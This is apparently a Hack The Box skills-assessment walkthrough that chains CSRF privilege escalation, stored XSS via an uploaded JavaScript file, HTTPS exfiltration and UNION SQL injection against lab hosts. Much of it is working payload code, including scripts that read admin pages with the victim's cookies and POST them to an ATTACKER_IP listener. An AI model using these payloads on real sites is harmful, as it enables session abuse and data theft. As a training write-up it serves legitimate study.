# Advanced XSS + CSRF — Skills Assessment

This lab chains four techniques together: CSRF to escalate privileges, XSS via file upload, HTTPS exfiltration, and SQL injection through an API. None of them work independently — you need all four.

---

## Scenario

You have a regular user account. An admin bot periodically visits certain pages. The goal is to become a moderator, get the admin to execute your XSS, then use that XSS to hit an internal API with SQLi and extract a secret.

---

## Step 1: CSRF to Become Moderator

### Finding the Endpoint

Browse the app as a logged-in user. There's a user management or roles endpoint — something like `/users.php?userid=3` or `/promote?role=moderator`. This endpoint changes your role but is only accessible if you're already an admin.

However, the CSRF protection is weak or absent. If the admin bot visits a page you control, you can make it issue this request on your behalf via CSRF.

### Setting Up the CSRF

Host your CSRF page. The app uses an `exploitserver.htb` vhost as the "attacker-controlled server." Create a CSRF page there:

```html
<!-- exploit.html on exploitserver.htb -->
<html>
<body>
<script>
  // Redirect the admin's browser to the role escalation endpoint
  window.location = "https://vulnerablesite.htb/users.php?userid=3";
</script>
</body>
</html>
```

Now you need the admin bot to visit your exploit page. The app has a "report" feature — submit the exploit URL. The admin bot visits it, gets redirected to the role change endpoint, and your account gets elevated to moderator.

### Verifying

After the admin bot visits, refresh your session. You should now have moderator access.

---

## Step 2: XSS via File Upload

### Context

As a moderator, you can access a "tasks" feature. The admin bot monitors the tasks page. You can upload files and reference them from tasks.

### The Upload

The file upload accepts various file types. Upload a `.js` file containing your XSS payload:

```javascript
// payload.js — will be uploaded as a file, referenced from a task
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://ATTACKER_IP/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

### Delivering via Tasks

Create a task with a description that includes a `<script>` tag referencing your uploaded file:

```html
<script src="/display_file.php?file_id=FILE_ID_HERE"></script>
```

When the admin bot loads the tasks page, it executes your script, which fetches `/admin.php` (with the admin's credentials, due to `withCredentials`) and sends it to your listener.

### The HTTPS Listener Problem

The app is HTTPS. Browsers block mixed content — a page loaded over HTTPS cannot make XHR requests to an HTTP endpoint. Your exfil listener needs to be HTTPS too.

Set up a Python HTTPS server with a self-signed cert:

```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes \
  -subj "/CN=attacker"

# HTTPS server
python3 -c "
import ssl, http.server, json

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print('[LOG]', body.decode())
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()
    def log_message(self, *a): pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')
s = http.server.HTTPServer(('0.0.0.0', 443), Handler)
s.socket = ctx.wrap_socket(s.socket, server_side=True)
print('Listening on 443...')
s.serve_forever()
"
```

The admin bot's headless Chrome accepts self-signed certificates (it's launched with `--ignore-certificate-errors`).

---

## Step 3: Extract Admin Panel Data

When the callback arrives, decode the base64:

```python
import base64
data = "BASE64_FROM_LOG"
print(base64.b64decode(data).decode())
```

The `/admin.php` response will contain admin-specific information — look for tokens, user lists, or links to other endpoints.

---

## Step 4: SQL Injection via API

The admin panel reveals an API endpoint. Something like `https://api.vulnerablesite.htb/v1/customer/PARAM`. The parameter is injectable.

Update your XSS payload to hit the API with a UNION-based SQLi:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,secretdata FROM secretdata-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("POST", "https://ATTACKER_IP/log", false);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
```

Upload this as a new JS file, create a new task referencing it, wait for the admin bot to execute it, and decode the response.

The SQLi result will contain the secret/flag.

---

## Full Attack Flow

```
1. CSRF via exploitserver.htb → admin bot visits → you become moderator
2. Upload JS payload to file upload → create task with <script src="..."> tag
3. Admin bot visits tasks page → your JS runs in admin context
4. XHR to /admin.php with admin cookies → exfil to HTTPS listener
5. Decode response → find internal API endpoint
6. New JS payload with UNION SQLi → exfil API response → extract flag
```

---

## Key Gotchas

**Mixed content:** Always use HTTPS for your exfil endpoint when the target app is HTTPS. HTTP will be silently blocked.

**Self-signed certs work:** The admin bot in HTB labs uses `--ignore-certificate-errors`. This is a deliberate lab design choice.

**CORS on your listener:** Add `Access-Control-Allow-Origin: *` in the response headers. XHR won't block same-origin responses here since you're the exfil server, but the OPTIONS preflight can trip you up.

**Timing:** After uploading a payload and creating a task, the admin bot visits on a schedule (usually every 30-60 seconds). Be patient and check your listener.

**File ID:** After uploading, note the file ID. The task description needs to reference the exact ID. Don't assume it's incremental — check the upload response.
